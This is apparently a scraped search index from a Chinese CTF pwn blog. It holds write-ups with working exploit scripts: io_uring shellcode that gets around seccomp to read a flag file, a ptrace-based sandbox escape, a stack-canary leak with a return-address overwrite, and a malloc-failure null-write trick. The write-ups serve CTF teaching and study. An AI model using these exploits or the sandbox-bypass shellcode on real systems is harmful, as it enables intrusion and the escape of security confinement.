timeout_flags; __u32 accept_flags; __u32 cancel_flags; __u32 open_flags; __u32 statx_flags; __u32 fadvise_advice; __u32 splice_flags; __u32 rename_flags; __u32 unlink_flags; __u32 hardlink_flags; __u32 xattr_flags; __u32 msg_ring_flags; __u32 uring_cmd_flags; __u32 waitid_flags; __u32 futex_flags; __u32 install_fd_flags; __u32 nop_flags; }; __u64 user_data; /* data to be passed back at completion time */ /* pack this to avoid bogus arm OABI complaints */ union { /* index into fixed buffers, if used */ __u16 buf_index; /* for grouped buffer selection */ __u16 buf_group; } __attribute__((packed)); /* personality to use, if used */ __u16 personality; union { __s32 splice_fd_in; __u32 file_index; __u32 optlen; struct { __u16 addr_len; __u16 __pad3[1]; }; }; union { struct { __u64 addr3; __u64 __pad2[1]; }; __u64 optval; /* * If the ring is initialized with IORING_SETUP_SQE128, then * this field is used for 80 bytes of arbitrary command data */ __u8 cmd[0]; }; }; ","date":"2025-08-23","objectID":"/posts/io_uring/:1:2","tags":null,"title":"io_uring","uri":"/posts/io_uring/#io_uring_enter"},{"categories":["pwn"],"collections":null,"content":"模板\rfrom pwn import * \"\"\" rsp+0x100 0x078: struct io_uring_params params = {}; rsp+0x200 0x008: uring_fd rsp+0x208 0x008: sq_ring ptr rsp+0x210 0x008: cq_ring ptr rsp+0x218 0x008: sqes ptr rsp+0x220 0x008: flag_fd rsp+0x300 0x100: buffer \"\"\" shellcode = asm(\"\"\" /*视情况调整栈帧*/ add rsp, 0x2000 /*int uring_fd = syscall(SYS_io_uring_setup, 16, \u0026params);*/ mov rax, 0 lea rdi, [rsp+0x100] mov rcx, 15 rep stosq mov rdi, 16 lea rsi, [rsp+0x100] mov rax, 0x1a9 syscall /*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/ mov qword ptr [rsp+0x200], rax xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0 mov rax, 9 syscall mov qword ptr [rsp+0x208], rax /*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/ xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0x8000000 mov rax, 9 syscall mov qword ptr [rsp+0x210], rax /*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/ xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0x10000000 mov rax, 9 syscall mov qword ptr [rsp+0x218], rax /*openat*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 18 /*opcode*/ mov byte ptr [rdi+1], 0 /* IOSQE_ flags*/ mov dword ptr [rdi+4], -100 /* file descriptor to do IO on */ /* 要打开文件的路径存放在 rsp+0x300 处 */ mov rax, 0x67616c662f2e mov qword ptr [rsp+0x300], rax lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax /*pathname*/ mov dword ptr [rdi+28], 0 /*open_flag*/ mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 1 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall mov rdi, qword ptr [rsp+0x210] mov edx, dword ptr [rsp+0x164] add rdi, rdx mov edx, dword ptr [rdi+8] mov qword ptr [rsp+0x220], rdx /*read*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 22 mov rax, qword ptr [rsp+0x220] mov dword ptr [rdi+4], eax lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax mov dword ptr [rdi+24], 0x100 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 1 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall /*write*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 23 mov dword ptr [rdi+4], 1 lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax mov dword ptr [rdi+24], 0x100 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 3 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall \"\"\") mmap映射： 在初始化io_uring的时候，分别对SQ、CQ、SQEs进行了三次mmap映射，offset参数需要分别设置为IORING_OFF_SQ_RING、IORING_OFF_CQ_RING、IORING_OFF_SQES #define IORING_OFF_SQ_RING 0ULL #define IORING_OFF_CQ_RING 0x8000000ULL #define IORING_OFF_SQES 0x10000000ULL ","date":"2025-08-23","objectID":"/posts/io_uring/:1:3","tags":null,"title":"io_uring","uri":"/posts/io_uring/#模板"},{"categories":["pwn"],"collections":null,"content":"liburing\r实现了对底层系统调用的封装 初始化与清理 struct io_uring ring; // 初始化 (默认128条目) int io_uring_queue_init(unsigned entries, struct io_uring *ring, unsigned flags); // 清理资源 void io_uring_queue_exit(struct io_uring *ring); 提交队列管理 // 获取下一个可用的 SQE struct io_uring_sqe *io_uring_get_sqe(struct io_uring *ring); // 批量提交 SQE int io_uring_submit(struct io_uring *ring); 操作准备函数 // 准备读操作 void io_uring_prep_read(struct io_uring_sqe *sqe, int fd, void *buf, unsigned nbytes, off_t offset); // 准备写操作 void io_uring_prep_write(struct io_uring_sqe *sqe, int fd, const void *buf, unsigned nbytes, off_t offset); // 准备打开操作 void io_uring_prep_openat(struct io_uring_sqe *sqe, int dfd, const char *path, int flags, mode_t mode); // 准备关闭操作 void io_uring_prep_close(struct io_uring_sqe *sqe, int fd); 完成处理 // 等待完成事件 int io_uring_wait_cqe(struct io_uring *ring, struct io_uring_cqe **cqe); // 查看完成事件(非阻塞) int io_uring_peek_cqe(struct io_uring *ring, struct io_uring_cqe **cqe); // 标记事件已处理 void io_uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe); 进行orw // gcc -o shellcode shellcode.c -luring -lseccomp -static #include \u003cstdio.h\u003e #include \u003cfcntl.h\u003e #include \u003cunistd.h\u003e #include \u003cliburing.h\u003e #include \u003cseccomp.h\u003e #include \u003csyscall.h\u003e #define BUFFER_SIZE 4096 int main() { struct io_uring ring; struct io_uring_cqe *cqe; struct io_uring_sqe *sqe; char buffer[BUFFER_SIZE] = {0}; int fd; io_uring_queue_init(16, \u0026ring, 0); sqe = io_uring_get_sqe(\u0026ring); io_uring_prep_openat(sqe, AT_FDCWD, \"flag\", O_RDONLY, 0); io_uring_submit(\u0026ring); io_uring_wait_cqe(\u0026ring, \u0026cqe); fd = cqe-\u003eres; sqe = io_uring_get_sqe(\u0026ring); io_uring_prep_read(sqe, fd, buffer, BUFFER_SIZE, 0); io_uring_submit(\u0026ring); io_uring_wait_cqe(\u0026ring, \u0026cqe); sqe = io_uring_get_sqe(\u0026ring); io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFFER_SIZE, 0); io_uring_submit(\u0026ring); io_uring_queue_exit(\u0026ring); return 0; } ","date":"2025-08-23","objectID":"/posts/io_uring/:1:4","tags":null,"title":"io_uring","uri":"/posts/io_uring/#liburing"},{"categories":["pwn"],"collections":null,"content":"ACTF 2023 master-of-rop\r沙箱禁掉了常用的orw及其替代syscall，需要寻找一些其他的替代syscall line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x19 0xc000003e if (A != ARCH_X86_64) goto 0027 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u003c 0x40000000) goto 0005 0004: 0x15 0x00 0x16 0xffffffff if (A != 0xffffffff) goto 0027 0005: 0x15 0x15 0x00 0x00000000 if (A == read) goto 0027 0006: 0x15 0x14 0x00 0x00000001 if (A == write) goto 0027 0007: 0x15 0x13 0x00 0x00000002 if (A == open) goto 0027 0008: 0x15 0x12 0x00 0x00000011 if (A == pread64) goto 0027 0009: 0x15 0x11 0x00 0x00000012 if (A == pwrite64) goto 0027 0010: 0x15 0x10 0x00 0x00000013 if (A == readv) goto 0027 0011: 0x15 0x0f 0x00 0x00000014 if (A == writev) goto 0027 0012: 0x15 0x0e 0x00 0x00000028 if (A == sendfile) goto 0027 0013: 0x15 0x0d 0x00 0x0000002c if (A == sendto) goto 0027 0014: 0x15 0x0c 0x00 0x0000002e if (A == sendmsg) goto 0027 0015: 0x15 0x0b 0x00 0x0000003b if (A == execve) goto 0027 0016: 0x15 0x0a 0x00 0x00000101 if (A == openat) goto 0027 0017: 0x15 0x09 0x00 0x00000127 if (A == preadv) goto 0027 0018: 0x15 0x08 0x00 0x00000128 if (A == pwritev) goto 0027 0019: 0x15 0x07 0x00 0x0000012f if (A == name_to_handle_at) goto 0027 0020: 0x15 0x06 0x00 0x00000130 if (A == open_by_handle_at) goto 0027 0021: 0x15 0x05 0x00 0x00000142 if (A == execveat) goto 0027 0022: 0x15 0x04 0x00 0x00000147 if (A == preadv2) goto 0027 0023: 0x15 0x03 0x00 0x00000148 if (A == pwritev2) goto 0027 0024: 0x15 0x02 0x00 0x000001ac if (A == 0x1ac) goto 0027 0025: 0x15 0x01 0x00 0x000001b5 if (A == 0x1b5) goto 0027 0026: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0027: 0x06 0x00 0x00 0x00000000 return KILL ","date":"2025-08-23","objectID":"/posts/io_uring/:2:0","tags":null,"title":"io_uring","uri":"/posts/io_uring/#actf-2023-master-of-rop"},{"categories":["pwn"],"collections":null,"content":"确定内核版本\r首先需要确定内核版本 确定内核版本的方法： 以我本地为例，我的内核版本 6.6.87，但是我去调用一些新内核版本才有的系统调用： shellcode = asm(''' mov rax, 454 xor rdi, rdi xor rsi, rsi xor rdx, rdx syscall ''') 这个syscall的返回值存在RAX是：0xffffffffffffffda，在 64 位有符号数下就是 -38。表示 syscall 返回了 -ENOSYS，说明该系统调用在你这个内核版本中不存在。 远程的话不会回显，可以通过 cmp rax, -38判断，如果ENOSYS就wirte一些信息 ","date":"2025-08-23","objectID":"/posts/io_uring/:2:1","tags":null,"title":"io_uring","uri":"/posts/io_uring/#确定内核版本"},{"categories":["pwn"],"collections":null,"content":"寻找代替系统调用\r由于禁掉了常用的一些orw系统调用，需要去寻找其他替代的系统调用来orw 别人测得的版本小于 6.1.60 以 linux-5.15.137 为参考 深入SYS_openat后发现，其主要逻辑是调用do_filp_open，而do_file_open又会被io_uring.c这个文件调用。 了解io_uring之后发现其能够替代orw，至此，确定了通过io_uring实现orw ","date":"2025-08-23","objectID":"/posts/io_uring/:2:2","tags":null,"title":"io_uring","uri":"/posts/io_uring/#寻找代替系统调用"},{"categories":["pwn"],"collections":null,"content":"实现\rliburing提供了对底层系统调用的封装，但是看了看，还是觉得直接用系统调用写shellcode比较简单，这里直接用模板 exp: from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) shellcode = asm(\"\"\" /*视情况调整栈帧*/ add rsp, 0x2000 /*int uring_fd = syscall(SYS_io_uring_setup, 16, \u0026params);*/ mov rax, 0 lea rdi, [rsp+0x100] mov rcx, 15 rep stosq mov rdi, 16 lea rsi, [rsp+0x100] mov rax, 0x1a9 syscall /*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/ mov qword ptr [rsp+0x200], rax xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0 mov rax, 9 syscall mov qword ptr [rsp+0x208], rax /*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/ xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0x8000000 mov rax, 9 syscall mov qword ptr [rsp+0x210], rax /*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/ xor rdi, rdi mov rsi, 0x1000 mov rdx, 3 mov r10, 1 mov r8, qword ptr [rsp+0x200] mov r9, 0x10000000 mov rax, 9 syscall mov qword ptr [rsp+0x218], rax /*openat*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 18 /*opcode*/ mov byte ptr [rdi+1], 0 /* IOSQE_ flags*/ mov dword ptr [rdi+4], -100 /* file descriptor to do IO on */ /* 要打开文件的路径存放在 rsp+0x300 处 */ mov rax, 0x67616c662f2e mov qword ptr [rsp+0x300], rax lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax /*pathname*/ mov dword ptr [rdi+28], 0 /*open_flag*/ mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 1 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall mov rdi, qword ptr [rsp+0x210] mov edx, dword ptr [rsp+0x164] add rdi, rdx mov edx, dword ptr [rdi+8] mov qword ptr [rsp+0x220], rdx /*read*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 22 mov rax, qword ptr [rsp+0x220] mov dword ptr [rdi+4], eax lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax mov dword ptr [rdi+24], 0x100 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 1 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall /*write*/ mov rax, 0 mov rdi, qword ptr [rsp+0x218] mov rcx, 8 rep stosq mov rdi, qword ptr [rsp+0x218] mov byte ptr [rdi], 23 mov dword ptr [rdi+4], 1 lea rax, [rsp+0x300] mov qword ptr [rdi+16], rax mov dword ptr [rdi+24], 0x100 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x140] add rdi, rdx mov dword ptr [rdi], 0 mov rdi, qword ptr [rsp+0x208] mov edx, dword ptr [rsp+0x12c] add rdi, rdx add dword ptr [rdi], 1 mov rdi, qword ptr [rsp+0x200] mov rsi, 1 mov rdx, 3 mov r10, 1 xor r8, r8 xor r9, r9 mov rax, 0x1aa syscall \"\"\") p.recvuntil(b'code\\n') # dbg() p.send(shellcode) p.interactive() 可能要多打几次才能打通 ","date":"2025-08-23","objectID":"/posts/io_uring/:2:3","tags":null,"title":"io_uring","uri":"/posts/io_uring/#实现"},{"categories":["pwn"],"collections":null,"content":"参考文章\rhttps://www.yuque.com/xiaocangxu/pwn/pd2zc37ebgbanvau#vqGHAs https://kernel.dk/io_uring.pdf [译] Linux 异步 I/O 框架 io_uring：基本原理、程序示例与性能压测（2020） 星盟WP ","date":"2025-08-23","objectID":"/posts/io_uring/:3:0","tags":null,"title":"io_uring","uri":"/posts/io_uring/#参考文章"},{"categories":["WP"],"collections":null,"content":"canon_event\rptrace + 沙箱绕过 int __fastcall main(int argc, const char **argv, const char **envp) { void *v3; // rbx void *v4; // rax void *v5; // r12 unsigned int uint; // ebp v3 = mmap((void *)0xDEAD000, 0x1000u, 3, 50, -1, 0); v4 = mmap((void *)0xDEAE000, 0x1000u, 3, 50, -1, 0); if ( v3 == (void *)-1LL || (v5 = v4, v4 == (void *)-1LL) ) err(1, \"mmap failed\"); printf(\"code size: \"); uint = get_uint(); // 输入shellcode长度 if ( uint \u003e 0x1000 ) // shellcode长度大于0x1000就报错 { puts(\"invalid code size\"); exit(1); } printf(\"enter shellcode: \"); if ( read(0, v3, uint) \u003c 0 ) // 读入shellcode err(1, \"read failed\"); if ( mprotect(v3, 0x1000u, 5) \u003c 0 ) err(1, \"mprotect failed\"); isolate_and_jump((void (__fastcall *)(_QWORD, void *))v3, v5); //开sandbox，然后去执行shellcode return 0; } line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x0000000c A = instruction_pointer \u003e\u003e 32 0001: 0x35 0x04 0x00 0x00008000 if (A \u003e= 0x8000) goto 0006 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x02 0x00 0x0000003d if (A == wait4) goto 0006 0004: 0x15 0x01 0x00 0x00000065 if (A == ptrace) goto 0006 0005: 0x15 0x00 0x01 0x00000039 if (A != fork) goto 0007 0006: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0007: 0x06 0x00 0x00 0x80000000 return KILL_PROCESS 只允许三个系统调用：wait4、ptrace、fork exp: #!/usr/bin/env python3 from pwn import * from time import sleep exe = ELF(\"./pwn\") context.terminal = [\"tmux\", \"splitw\", \"-h\"] context.binary = exe def dbg(r): gdb.attach(r) pause() # DOCKER_PORT = 1337 # REMOTE_NC_CMD = \"nc localhost 444\" # `nc \u003chost\u003e \u003cport\u003e` bstr = lambda x: str(x).encode() ELF.binsh = lambda self: next(self.search(b\"/bin/sh\\0\")) GDB_SCRIPT = \"\"\" set follow-fork-mode child set follow-exec-mode same c \"\"\" def main(): r = process(\"./pwn\") PTRACE_CONT = 7 PTRACE_GETREGS = 12 PTRACE_SETREGS = 13 PTRACE_SYSCALL = 24 RIP_OFFSET = 8*16 shellcode = asm(f\"\"\" mov eax, SYS_fork syscall test eax, eax jz child mov r13, rax mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_SYSCALL} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_GETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov rdi, 0x820000000000 lea rbx, [rsp+{RIP_OFFSET}] mov [rbx], rdi mov eax, SYS_ptrace mov edi, {PTRACE_SETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov eax, SYS_ptrace mov edi, {PTRACE_CONT} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 mov rsi, rsp xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_GETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall lea rdi, [rip+sendfile] lea rbx, [rsp+{RIP_OFFSET}] mov [rbx], rdi mov eax, SYS_ptrace mov edi, {PTRACE_SETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov eax, SYS_ptrace mov edi, {PTRACE_SYSCALL} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall mov eax, SYS_ptrace mov edi, {PTRACE_GETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov rdi, 0x820000000000 lea rbx, [rsp+{RIP_OFFSET}] mov [rbx], rdi mov eax, SYS_ptrace mov edi, {PTRACE_SETREGS} mov rsi, r13 xor edx, edx mov r10, rsp syscall mov eax, SYS_ptrace mov edi, {PTRACE_CONT} mov rsi, r13 xor edx, edx xor r10, r10 syscall mov eax, SYS_wait4 mov rdi, r13 xor esi, esi xor edx, edx xor r10, r10 syscall hlt child: mov eax, SYS_ptrace xor edi, edi xor esi, esi xor edx, edx xor r10, r10 syscall int3 open: mov eax, SYS_open lea rdi, [rip+flag] xor esi, esi xor edx, edx syscall sendfile: mov rax, SYS_sendfile mov rdi, 1 mov rsi, 3 xor edx, edx mov r10, 0x50 syscall hlt flag: \"\"\") + b\"flag.txt\\0\" dbg(r) r.sendline(bstr(len(shellcode))) r.send(shellcode) r.interactive() if __name__ == \"__main__\": main() shellcode解释： SYS_fork parent_process: wait4 //等待TRACEME PTRACE_SYSCALL //捕获下一次syscall信号，即open的syscall wait4 //等待open的syscall开始 PTRACE_GETREGS //获取寄存器信","date":"2025-08-07","objectID":"/posts/trxctf2025/:1:0","tags":null,"title":"TRXCTF2025","uri":"/posts/trxctf2025/#canon_event"},{"categories":["WP"],"collections":null,"content":"Virtual_Insanity\r栈溢出+利用vsyscall 就不写了。。。 ","date":"2025-08-07","objectID":"/posts/trxctf2025/:2:0","tags":null,"title":"TRXCTF2025","uri":"/posts/trxctf2025/#virtual_insanity"},{"categories":["reading"],"collections":null,"content":"摘录\rquote\r“为什么人很容易飘飘然？因为你浅薄呀 浅薄的东西就是容易飘起来” ——罗翔\rquote\r“我们画不出那个完美的圆，但是我们仍然应当努力，虽不能至心向往之”\rquote\r“我们每个人都并不优越于他人，每个人都是有限的。我们时常需要聆听苏格拉底的德尔菲神谕，承认自己的无知和有限，渺小和幽暗”\rquote\r“本质上，过分的夸奖与过分的批评不都是误解吗？误解本来就是人生常态，不要喜欢好听的误解，而厌恶不好听的误解。”\r","date":"2025-08-06","objectID":"/posts/read_fzdxj/:1:0","tags":null,"title":"《法治的细节》","uri":"/posts/read_fzdxj/#摘录"},{"categories":["WP"],"collections":null,"content":" HTB的一个比赛 ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:0:0","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#"},{"categories":["WP"],"collections":null,"content":"Quack_Quack\runsigned __int64 duckling() { char *v1; // [rsp+8h] [rbp-88h] _QWORD buf[4]; // [rsp+10h] [rbp-80h] BYREF _QWORD v3[11]; // [rsp+30h] [rbp-60h] BYREF unsigned __int64 v4; // [rsp+88h] [rbp-8h] v4 = __readfsqword(0x28u); memset(buf, 0, sizeof(buf)); memset(v3, 0, 80); printf(\"Quack the Duck!\\n\\n\u003e \"); fflush(_bss_start); read(0, buf, 0x66u); v1 = strstr((const char *)buf, \"Quack Quack \"); if ( !v1 ) { error(\"Where are your Quack Manners?!\\n\"); exit(1312); } printf(\"Quack Quack %s, ready to fight the Duck?\\n\\n\u003e \", v1 + 32); read(0, v3, 0x6Au); puts(\"Did you really expect to win a fight against a Duck?!\\n\"); return v4 - __readfsqword(0x28u); } unsigned __int64 duck_attack() { char buf; // [rsp+3h] [rbp-Dh] BYREF int fd; // [rsp+4h] [rbp-Ch] unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); fd = open(\"./flag.txt\", 0); if ( fd \u003c 0 ) { perror(\"\\nError opening flag.txt, please contact an Administrator\\n\"); exit(1); } while ( read(fd, \u0026buf, 1u) \u003e 0 ) fputc(buf, _bss_start); close(fd); return v3 - __readfsqword(0x28u); } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:0","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#quack_quack"},{"categories":["WP"],"collections":null,"content":"strstr函数\r#include \u003cstring.h\u003e char *strstr(const char *haystack, const char *needle); 功能：在 haystack（主字符串）中查找 needle（子字符串）的首次出现位置。 返回值： 找到时：返回指向首次匹配位置的指针。 未找到时：返回 NULL。 char *s = \"Hello_CTF_World\"; char *p = strstr(s, \"CTF\"); // p 指向 \"CTF_World\" ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#strstr函数"},{"categories":["WP"],"collections":null,"content":"思路\r通过strstr函数，控制v1指针 让v1+32指向canary，第20行的printf会输出canary read进canary、控制返回地址到duck_attack，输出flag ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:2","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#思路"},{"categories":["WP"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './quack_quack' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) backdoor = 0x40137F #canary会以\\x00结尾，所以要加个1 p.recvuntil(b'Quack the Duck!\\n\\n\u003e ') pl = b'a'*(0x80 - 0x8 - 0x20 + 1) + b\"Quack Quack \" # dbg() p.send(pl) p.recvuntil(b'Quack Quack ') canary = u64(p.recv(7).rjust(8,b'\\x00')) #在低位补\\x00 success(\"canary---\u003e 0x%x\",canary) pl = b'a'*(0x60 - 0x8) pl+= p64(canary) pl+=p64(0xdeedbeef) pl+= p16(0x137f) # dbg() p.send(pl) p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:1:3","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp"},{"categories":["WP"],"collections":null,"content":"blessing\rint __fastcall main(int argc, const char **argv, const char **envp) { size_t size; // [rsp+8h] [rbp-28h] BYREF unsigned __int64 i; // [rsp+10h] [rbp-20h] _QWORD *v6; // [rsp+18h] [rbp-18h] void *buf; // [rsp+20h] [rbp-10h] unsigned __int64 v8; // [rsp+28h] [rbp-8h] v8 = __readfsqword(0x28u); setup(argc, argv, envp); banner(); size = 0; v6 = malloc(0x30000u); *v6 = 1; printstr( \"In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!\\n\" \"\\n\" \"Please accept this: \"); printf(\"%p\", v6); sleep(1u); for ( i = 0; i \u003c= 0xD; ++i ) { printf(\"\\b \\b\"); usleep(0xEA60u); } puts(\"\\n\"); printf( \"%s[%sBard%s]: Now, I want something in return...\\n\\nHow about a song?\\n\\nGive me the song's length: \", \"\\x1B[1;34m\", \"\\x1B[1;32m\", \"\\x1B[1;34m\"); __isoc99_scanf(\"%lu\", \u0026size); buf = malloc(size); printf(\"\\n%s[%sBard%s]: Excellent! Now tell me the song: \", \"\\x1B[1;34m\", \"\\x1B[1;32m\", \"\\x1B[1;34m\"); read(0, buf, size); *(_QWORD *)((char *)buf + size - 1) = 0; write(1, buf, size); if ( *v6 ) printf(\"\\n%s[%sBard%s]: Your song was not as good as expected...\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;32m\", \"\\x1B[1;31m\"); else read_flag(); return 0; } man malloc RETURN VALUE The malloc(), calloc(), realloc(), and reallocarray() functions return a pointer to the allocated memory, which is suitably aligned for any type that fits into the requested size or less. On error, these functions return NULL and set errno. Attempting to allocate more than PTRDIFF_MAX bytes is considered an error, as an object that large could cause later pointer subtraction to overflow. ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:2:0","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#blessing"},{"categories":["WP"],"collections":null,"content":"思路\r程序会输出heap_addr heap_addr很大，malloc(heap_addr)的时候，系统直接拒绝，返回NULL 所以可以控制 (_QWORD *)((char *)buf + size - 1) = v6 就可以让 *v6 = 0，去readflag ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:2:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#思路-1"},{"categories":["WP"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './blessing' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) p.recvuntil(b'Please accept this: ') heap_addr = int(p.recv(14),16) success(\"heap_addr = 0x%x\",heap_addr) # dbg() p.sendlineafter(b'length: ',str(heap_addr +1)) p.send(b'a') p.interactive() 